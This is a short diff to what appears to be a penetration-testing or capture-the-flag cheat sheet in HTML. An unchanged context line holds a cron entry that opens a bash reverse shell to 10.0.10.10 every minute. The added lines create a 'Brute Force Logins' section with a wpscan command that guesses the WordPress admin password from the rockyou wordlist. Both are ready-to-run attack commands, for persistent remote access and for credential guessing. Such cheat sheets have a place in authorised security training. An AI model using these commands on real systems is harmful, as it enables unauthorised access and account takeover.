@@ -325,8 +325,15 @@ then <code>echo ' * * * * * bash -i >& /dev/tcp/10.0.10.10/5555 0>&1' >> /etc/cr
 Then you just have to look and wait in your lister terminal for 1 min.
 
 
+<br><h1>Brute Force Logins</h1>
 
-<h1>Password Cracking</h1>
+<b>Brute Force Wordpress Login</b>
+
+<code>wpscan --url http://10.10.20.20/blog -U admin -P /opt/wordlists/rockyou.txt -t 20</code>
+
+
+
+<br><h1>Password Cracking</h1>
 
 <b>ZIP</b>
 
